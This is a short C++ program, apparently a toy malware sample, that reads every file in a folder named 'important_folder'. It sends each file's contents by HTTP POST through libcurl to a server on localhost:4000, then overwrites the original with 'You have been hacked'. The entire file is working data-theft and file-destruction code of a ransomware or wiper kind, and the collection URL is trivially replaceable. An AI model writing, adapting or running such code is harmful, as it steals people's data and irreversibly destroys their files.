#include <curl/curl.h>
#include <filesystem>
#include <fstream>
#include <iostream>

using namespace std;

int main() {
    const string FINAL_MESSAGE = "You have been hacked";
    filesystem::path TARGET_FOLDER("./important_folder");
    
    string content;

    for (auto file: filesystem::directory_iterator(TARGET_FOLDER)) {
        string file_path = file.path().string();
        string content;
        
        ifstream input_stream;
        input_stream.open(file_path);

        while (!input_stream.eof()) {
            char ch = input_stream.get();
            if (ch != EOF) {
                content.push_back(ch);
            }
        }
        input_stream.close();

        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:4000");
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, content.c_str());
            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                cout << "Unable to copy files" << endl;
            } else {
                ofstream output_stream;
                output_stream.open(file_path);
                for (auto& ch: FINAL_MESSAGE) {
                    output_stream << ch;
                }
                output_stream.close();
            }
        }
    }
    return 0;
}
